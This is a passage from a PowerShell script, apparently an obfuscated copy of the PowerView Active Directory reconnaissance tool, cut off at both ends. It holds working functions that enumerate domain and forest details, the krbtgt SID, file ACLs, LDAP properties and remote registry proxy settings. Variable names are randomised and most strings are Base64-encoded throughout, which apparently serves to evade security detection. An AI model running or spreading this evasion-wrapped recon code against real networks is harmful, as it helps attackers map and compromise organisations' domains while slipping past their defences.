        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBOAFMAXwBMAE8ARwBPAE4AXwBBAEMAQwBPAFUATgBUAA=='))), 131072)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEEAUgBUAEMAQQBSAEQAXwBSAEUAUQBVAEkAUgBFAEQA'))), 262144)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARABfAEYATwBSAF8ARABFAEwARQBHAEEAVABJAE8ATgA='))), 524288)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwBEAEUATABFAEcAQQBUAEUARAA='))), 1048576)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBTAEUAXwBEAEUAUwBfAEsARQBZAF8ATwBOAEwAWQA='))), 2097152)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAFIARQBRAF8AUABSAEUAQQBVAFQASAA='))), 4194304)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAE8AUgBEAF8ARQBYAFAASQBSAEUARAA='))), 8388608)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARABfAFQATwBfAEEAVQBUAEgAXwBGAE8AUgBfAEQARQBMAEUARwBBAFQASQBPAE4A'))), 16777216)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFIAVABJAEEATABfAFMARQBDAFIARQBUAFMAXwBBAEMAQwBPAFUATgBUAA=='))), 67108864)
    }
    process {
        ${4735753f03654f27b679e627f9e7d835} = New-Object System.Collections.Specialized.OrderedDictionary
        if(${e90163d6067a479d9ce734224dc75bc9} -is [Int]) {
            ${6813252b61ab4c7cab7a7b8e3417f0bb} = ${e90163d6067a479d9ce734224dc75bc9}
        }
        if (${e90163d6067a479d9ce734224dc75bc9} -is [PSCustomObject]) {
            if(${e90163d6067a479d9ce734224dc75bc9}.useraccountcontrol) {
                ${6813252b61ab4c7cab7a7b8e3417f0bb} = ${e90163d6067a479d9ce734224dc75bc9}.useraccountcontrol
            }
        }
        if(${6813252b61ab4c7cab7a7b8e3417f0bb}) {
            if(${b48dbad4885b4800980979010426b8fd}) {
                foreach ($UACValue in ${477642117c8241ba89a5c9a261126284}.GetEnumerator()) {
                    if( (${6813252b61ab4c7cab7a7b8e3417f0bb} -band $UACValue.Value) -eq $UACValue.Value) {
                        ${4735753f03654f27b679e627f9e7d835}.Add($UACValue.Name, "$($UACValue.Value)+")
                    }
                    else {
                        ${4735753f03654f27b679e627f9e7d835}.Add($UACValue.Name, "$($UACValue.Value)")
                    }
                }
            }
            else {
                foreach ($UACValue in ${477642117c8241ba89a5c9a261126284}.GetEnumerator()) {
                    if( (${6813252b61ab4c7cab7a7b8e3417f0bb} -band $UACValue.Value) -eq $UACValue.Value) {
                        ${4735753f03654f27b679e627f9e7d835}.Add($UACValue.Name, "$($UACValue.Value)")
                    }
                }                
            }
        }
        ${4735753f03654f27b679e627f9e7d835}
    }
}
function Get-Proxy {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${c096522c7bbe4c7aaadf99843e3b09fb} = ${ENV:c096522c7bbe4c7aaadf99843e3b09fb}
    )
    process {
        try {
            ${43d13ff79b6143e7838149d02f176464} = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwB1AHIAcgBlAG4AdABVAHMAZQByAA=='))), ${c096522c7bbe4c7aaadf99843e3b09fb})
            ${38aef792e5ab4c62b2e4135429181d15} = ${43d13ff79b6143e7838149d02f176464}.OpenSubkey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwAXABNAGkAYwByAG8AcwBvAGYAdABcAFwAVwBpAG4AZABvAHcAcwBcAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAXABJAG4AdABlAHIAbgBlAHQAIABTAGUAdAB0AGkAbgBnAHMA'))))
            ${056b1ce6ffb5454891714349f70b1068} = ${38aef792e5ab4c62b2e4135429181d15}.GetValue($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AFMAZQByAHYAZQByAA=='))))
            ${06211ab02b2748e89aa7c59aff8210fa} = ${38aef792e5ab4c62b2e4135429181d15}.GetValue($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBDAG8AbgBmAGkAZwBVAFIATAA='))))
            if(${06211ab02b2748e89aa7c59aff8210fa} -and (${06211ab02b2748e89aa7c59aff8210fa} -ne "")) {
                try {
                    ${313313435c4e4e6e801ea8b6eeecefab} = (New-Object Net.Webclient).DownloadString(${06211ab02b2748e89aa7c59aff8210fa})
                }
                catch {
                    ${313313435c4e4e6e801ea8b6eeecefab} = ""
                }
            }
            else {
                ${313313435c4e4e6e801ea8b6eeecefab} = ""
            }
            if(${056b1ce6ffb5454891714349f70b1068} -or ${06211ab02b2748e89aa7c59aff8210fa}) {
                ${d90960fc83614a2fb42f43ab6aac95a1} = @{
                    'ProxyServer' = ${056b1ce6ffb5454891714349f70b1068}
                    'AutoConfigURL' = ${06211ab02b2748e89aa7c59aff8210fa}
                    'Wpad' = ${313313435c4e4e6e801ea8b6eeecefab}
                }
                New-Object -TypeName PSObject -Property ${d90960fc83614a2fb42f43ab6aac95a1}
            }
            else {
                Write-Warning "No proxy settings found for ${c096522c7bbe4c7aaadf99843e3b09fb}"
            }
        }
        catch {
            Write-Warning "Error enumerating proxy settings for ${c096522c7bbe4c7aaadf99843e3b09fb}"
        }
    }
}
function Get-PathAcl {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [string]
        ${efe450d53b084f3cb286d6a758f6ee94},
        [Switch]
        ${d722399685d842b19fa5d48261792164}
    )
    begin {
        function Convert-FileRight {
            [CmdletBinding()]
            param(
                [Int]
                ${d3343436563645a395cc6850c039d7da}
            )
            ${770dd19e03c9438e93e5a4ecf85c94f7} = @{
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADgAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBSAGUAYQBkAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBXAHIAaQB0AGUA')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBFAHgAZQBjAHUAdABlAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBBAGwAbABvAHcAZQBkAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMQAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAUwB5AHMAdABlAG0AUwBlAGMAdQByAGkAdAB5AA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAxADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AG4AYwBoAHIAbwBuAGkAegBlAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADgAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE8AdwBuAGUAcgA=')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADQAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEQAQQBDAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADIAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABDAG8AbgB0AHIAbwBsAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADEAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUA')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAxADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEEAdAB0AHIAaQBiAHUAdABlAHMA')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADgAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAHQAdAByAGkAYgB1AHQAZQBzAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADQAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAQwBoAGkAbABkAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQAvAFQAcgBhAHYAZQByAHMAZQA=')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEUAeAB0AGUAbgBkAGUAZABBAHQAdAByAGkAYgB1AHQAZQBzAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABFAHgAdABlAG4AZABlAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwA=')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAZQBuAGQARABhAHQAYQAvAEEAZABkAFMAdQBiAGQAaQByAGUAYwB0AG8AcgB5AA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEQAYQB0AGEALwBBAGQAZABGAGkAbABlAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABEAGEAdABhAC8ATABpAHMAdABEAGkAcgBlAGMAdABvAHIAeQA=')))
            }
            ${a8779104a0a74f968f9c66aea32b3eb1} = @{
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAZgAwADEAZgBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgB1AGwAbABDAG8AbgB0AHIAbwBsAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMwAwADEAYgBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAGQAaQBmAHkA')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAYQA5AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABFAHgAZQBjAHUAdABlAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADEAOQBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABXAHIAaQB0AGUA')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAOAA5AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZAA=')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADEAMQA2AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA==')))
            }
            ${4ffb4c62a5ab4e93aace6d298119cc66} = @()
            ${4ffb4c62a5ab4e93aace6d298119cc66} += ${a8779104a0a74f968f9c66aea32b3eb1}.Keys |  % {
                              if ((${d3343436563645a395cc6850c039d7da} -band $_) -eq $_) {
                                ${a8779104a0a74f968f9c66aea32b3eb1}[$_]
                                ${d3343436563645a395cc6850c039d7da} = ${d3343436563645a395cc6850c039d7da} -band (-not $_)
                              }
                            }
            ${4ffb4c62a5ab4e93aace6d298119cc66} += ${770dd19e03c9438e93e5a4ecf85c94f7}.Keys |
                            ? { ${d3343436563645a395cc6850c039d7da} -band $_ } |
                            % { ${770dd19e03c9438e93e5a4ecf85c94f7}[$_] }
            (${4ffb4c62a5ab4e93aace6d298119cc66} | ?{$_}) -join ","
        }
    }
    process {
        try {
            ${ae419e23762545d4aaf81370b8eae36f} = Get-Acl -Path ${efe450d53b084f3cb286d6a758f6ee94}
            ${ae419e23762545d4aaf81370b8eae36f}.GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier]) | % {
                ${52a3c36fc7674b8fa055f2b23c35df57} = @()
                if ($_.IdentityReference -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtADUALQAyADEALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwA=')))) {
                    ${b2929ecf6cd74a84bce9ccd2f5622fbb} = Get-ADObject -d72c41ecfd1e4100a077ef856e028545 $_.IdentityReference
                    ${52a3c36fc7674b8fa055f2b23c35df57} = @()
                    ${7cec28d15b114080ad6b502c42b39341} = @(${b2929ecf6cd74a84bce9ccd2f5622fbb}.objectsid)
                    if (${d722399685d842b19fa5d48261792164} -and (${b2929ecf6cd74a84bce9ccd2f5622fbb}.samAccountType -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAAwADUAMwAwADYAMwA2ADgA'))))) {
                        ${7cec28d15b114080ad6b502c42b39341} += Get-NetGroupMember -d72c41ecfd1e4100a077ef856e028545 ${b2929ecf6cd74a84bce9ccd2f5622fbb}.objectsid | select -ExpandProperty MemberSid
                    }
                    ${7cec28d15b114080ad6b502c42b39341} | % {
                        ${52a3c36fc7674b8fa055f2b23c35df57} += ,@($_, (Convert-SidToName $_))
                    }
                }
                else {
                    ${52a3c36fc7674b8fa055f2b23c35df57} += ,@($_.IdentityReference.Value, (Convert-SidToName $_.IdentityReference.Value))
                }
                ForEach(${be2d982dffb8435b9bc6f279ce7309a8} in ${52a3c36fc7674b8fa055f2b23c35df57}) {
                    ${fdf243b8b0474c12a0dae92138ba82bd} = New-Object PSObject
                    ${fdf243b8b0474c12a0dae92138ba82bd} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) ${efe450d53b084f3cb286d6a758f6ee94}
                    ${fdf243b8b0474c12a0dae92138ba82bd} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBTAHkAcwB0AGUAbQBSAGkAZwBoAHQAcwA='))) (Convert-FileRight -d3343436563645a395cc6850c039d7da $_.FileSystemRights.value__)
                    ${fdf243b8b0474c12a0dae92138ba82bd} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAA=='))) ${be2d982dffb8435b9bc6f279ce7309a8}[1]
                    ${fdf243b8b0474c12a0dae92138ba82bd} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFMASQBEAA=='))) ${be2d982dffb8435b9bc6f279ce7309a8}[0]
                    ${fdf243b8b0474c12a0dae92138ba82bd} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAQwBvAG4AdAByAG8AbABUAHkAcABlAA=='))) $_.AccessControlType
                    ${fdf243b8b0474c12a0dae92138ba82bd}
                }
            }
        }
        catch {
            Write-Warning $_
        }
    }
}
function Get-NameField {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        ${b2929ecf6cd74a84bce9ccd2f5622fbb}
    )
    process {
        if(${b2929ecf6cd74a84bce9ccd2f5622fbb}) {
            if ( [bool](${b2929ecf6cd74a84bce9ccd2f5622fbb}.PSobject.Properties.name -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))) ) {
                ${b2929ecf6cd74a84bce9ccd2f5622fbb}.dnshostname
            }
            elseif ( [bool](${b2929ecf6cd74a84bce9ccd2f5622fbb}.PSobject.Properties.name -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA=')))) ) {
                ${b2929ecf6cd74a84bce9ccd2f5622fbb}.name
            }
            else {
                ${b2929ecf6cd74a84bce9ccd2f5622fbb}
            }
        }
        else {
            return $Null
        }
    }
}
function Convert-LDAPProperty {
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        ${d90960fc83614a2fb42f43ab6aac95a1}
    )
    ${d4450b926309498f8c134809102610ae} = @{}
    ${d90960fc83614a2fb42f43ab6aac95a1}.PropertyNames | % {
        if (($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAGQAaABpAHMAdABvAHIAeQA='))))) {
            ${d4450b926309498f8c134809102610ae}[$_] = (New-Object System.Security.Principal.SecurityIdentifier(${d90960fc83614a2fb42f43ab6aac95a1}[$_][0],0)).Value
        }
        elseif($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA=')))) {
            ${d4450b926309498f8c134809102610ae}[$_] = (New-Object Guid (,${d90960fc83614a2fb42f43ab6aac95a1}[$_][0])).Guid
        }
        elseif( ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA=')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA=')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAUABhAHMAcwB3AG8AcgBkAFQAaQBtAGUA')))) ) {
            if (${d90960fc83614a2fb42f43ab6aac95a1}[$_][0] -is [System.MarshalByRefObject]) {
                ${19c69a43c106464fbf0fdd6b5df76a09} = ${d90960fc83614a2fb42f43ab6aac95a1}[$_][0]
                [Int32]$High = ${19c69a43c106464fbf0fdd6b5df76a09}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [System.Reflection.BindingFlags]::GetProperty, $null, ${19c69a43c106464fbf0fdd6b5df76a09}, $null)
                [Int32]$Low  = ${19c69a43c106464fbf0fdd6b5df76a09}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))),  [System.Reflection.BindingFlags]::GetProperty, $null, ${19c69a43c106464fbf0fdd6b5df76a09}, $null)
                ${d4450b926309498f8c134809102610ae}[$_] = ([datetime]::FromFileTime([Int64]($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AHgAOAB9AHsAMQA6AHgAOAB9AA=='))) -f $High, $Low)))
            }
            else {
                ${d4450b926309498f8c134809102610ae}[$_] = ([datetime]::FromFileTime((${d90960fc83614a2fb42f43ab6aac95a1}[$_][0])))
            }
        }
        elseif(${d90960fc83614a2fb42f43ab6aac95a1}[$_][0] -is [System.MarshalByRefObject]) {
            ${143725d0bfac46bfa987f3e7c4a42e6f} = ${d90960fc83614a2fb42f43ab6aac95a1}[$_]
            try {
                ${19c69a43c106464fbf0fdd6b5df76a09} = ${143725d0bfac46bfa987f3e7c4a42e6f}[$_][0]
                Write-Verbose $_
                [Int32]$High = ${19c69a43c106464fbf0fdd6b5df76a09}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [System.Reflection.BindingFlags]::GetProperty, $null, ${19c69a43c106464fbf0fdd6b5df76a09}, $null)
                [Int32]$Low  = ${19c69a43c106464fbf0fdd6b5df76a09}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))),  [System.Reflection.BindingFlags]::GetProperty, $null, ${19c69a43c106464fbf0fdd6b5df76a09}, $null)
                ${d4450b926309498f8c134809102610ae}[$_] = [Int64]($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AHgAOAB9AHsAMQA6AHgAOAB9AA=='))) -f $High, $Low)
            }
            catch {
                ${d4450b926309498f8c134809102610ae}[$_] = ${143725d0bfac46bfa987f3e7c4a42e6f}[$_]
            }
        }
        elseif(${d90960fc83614a2fb42f43ab6aac95a1}[$_].count -eq 1) {
            ${d4450b926309498f8c134809102610ae}[$_] = ${d90960fc83614a2fb42f43ab6aac95a1}[$_][0]
        }
        else {
            ${d4450b926309498f8c134809102610ae}[$_] = ${d90960fc83614a2fb42f43ab6aac95a1}[$_]
        }
    }
    New-Object -TypeName PSObject -Property ${d4450b926309498f8c134809102610ae}
}
function Get-DomainSearcher {
    [CmdletBinding()]
    param(
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [String]
        ${c4d5e29aa5ae43dc97a75d43cbc64f02},
        [String]
        ${bbc4680c371c4b70bf799c47787e7f27},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    if(!${afa30c601e734738b32424a6234484e4}) {
        ${afa30c601e734738b32424a6234484e4} = (Get-NetDomain).name
    }
    else {
        if(!${a3bf4f2494234d89b62febc9f379f624}) {
            try {
                ${a3bf4f2494234d89b62febc9f379f624} = ((Get-NetDomain).PdcRoleOwner).Name
            }
            catch {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQALQBEAG8AbQBhAGkAbgBTAGUAYQByAGMAaABlAHIAOgAgAEUAcgByAG8AcgAgAGkAbgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIABQAEQAQwAgAGYAbwByACAAYwB1AHIAcgBlAG4AdAAgAGQAbwBtAGEAaQBuAA==')))
            }
        }
    }
    ${ae07894d0d52435cbdca89d8fe0e660b} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwA=')))
    if(${a3bf4f2494234d89b62febc9f379f624}) {
        ${ae07894d0d52435cbdca89d8fe0e660b} += ${a3bf4f2494234d89b62febc9f379f624} + "/"
    }
    if(${bbc4680c371c4b70bf799c47787e7f27}) {
        ${ae07894d0d52435cbdca89d8fe0e660b} += ${bbc4680c371c4b70bf799c47787e7f27} + ","
    }
    if(${c4d5e29aa5ae43dc97a75d43cbc64f02}) {
        if(${c4d5e29aa5ae43dc97a75d43cbc64f02} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBDADoALwAvACoA')))) {
            ${e43ac2d547a843e5940f7f80752eb771} = ${c4d5e29aa5ae43dc97a75d43cbc64f02}
            ${ae07894d0d52435cbdca89d8fe0e660b} = ""
        }
        else {
            if(${c4d5e29aa5ae43dc97a75d43cbc64f02} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAqAA==')))) {
                ${c4d5e29aa5ae43dc97a75d43cbc64f02} = ${c4d5e29aa5ae43dc97a75d43cbc64f02}.Substring(7)
            }
            ${e43ac2d547a843e5940f7f80752eb771} = ${c4d5e29aa5ae43dc97a75d43cbc64f02}
        }
    }
    else {
        ${e43ac2d547a843e5940f7f80752eb771} = "DC=$(${afa30c601e734738b32424a6234484e4}.Replace('.', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQA=')))))"
    }
    ${ae07894d0d52435cbdca89d8fe0e660b} += ${e43ac2d547a843e5940f7f80752eb771}
    Write-Verbose "Get-DomainSearcher search string: ${ae07894d0d52435cbdca89d8fe0e660b}"
    ${7a1a8a62c2a9413989ed82181fa823b4} = New-Object System.DirectoryServices.DirectorySearcher([ADSI]${ae07894d0d52435cbdca89d8fe0e660b})
    ${7a1a8a62c2a9413989ed82181fa823b4}.PageSize = ${c8e7665cd4cc41d88229c3536a114f1b}
    ${7a1a8a62c2a9413989ed82181fa823b4}
}
function Get-NetDomain {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${afa30c601e734738b32424a6234484e4}
    )
    process {
        if(${afa30c601e734738b32424a6234484e4}) {
            ${403a42e797b24dedb7ebd080804bd56d} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))), ${afa30c601e734738b32424a6234484e4})
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${403a42e797b24dedb7ebd080804bd56d})
            }
            catch {
                Write-Warning "The specified domain ${afa30c601e734738b32424a6234484e4} does not exist, could not be contacted, or there isn't an existing trust."
                $Null
            }
        }
        else {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
    }
}
function Get-NetForest {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${b269a228f63c4b8fa8e609dcda3cbb66}
    )
    process {
        if(${b269a228f63c4b8fa8e609dcda3cbb66}) {
            ${a6281ee193b14bac9bd3bee10df42f30} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA'))), ${b269a228f63c4b8fa8e609dcda3cbb66})
            try {
                ${03fada381d26406b92573c72c987885d} = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(${a6281ee193b14bac9bd3bee10df42f30})
            }
            catch {
                Write-Debug "The specified forest ${b269a228f63c4b8fa8e609dcda3cbb66} does not exist, could not be contacted, or there isn't an existing trust."
                $Null
            }
        }
        else {
            ${03fada381d26406b92573c72c987885d} = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }
        if(${03fada381d26406b92573c72c987885d}) {
            ${8c7ecdbf2e4f41ea858d7c5d95ebf820} = (New-Object System.Security.Principal.NTAccount(${03fada381d26406b92573c72c987885d}.RootDomain,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA'))))).Translate([System.Security.Principal.SecurityIdentifier]).Value
            ${076e36dda7734263a96704324ac1ecf0} = ${8c7ecdbf2e4f41ea858d7c5d95ebf820} -Split "-"
            ${8c7ecdbf2e4f41ea858d7c5d95ebf820} = ${076e36dda7734263a96704324ac1ecf0}[0..$(${076e36dda7734263a96704324ac1ecf0}.length-2)] -join "-"
            ${03fada381d26406b92573c72c987885d} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABEAG8AbQBhAGkAbgBTAGkAZAA='))) ${8c7ecdbf2e4f41ea858d7c5d95ebf820}
            ${03fada381d26406b92573c72c987885d}
        }
    }
}
function Get-NetForestDomain {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${b269a228f63c4b8fa8e609dcda3cbb66},
        [String]
        ${afa30c601e734738b32424a6234484e4}
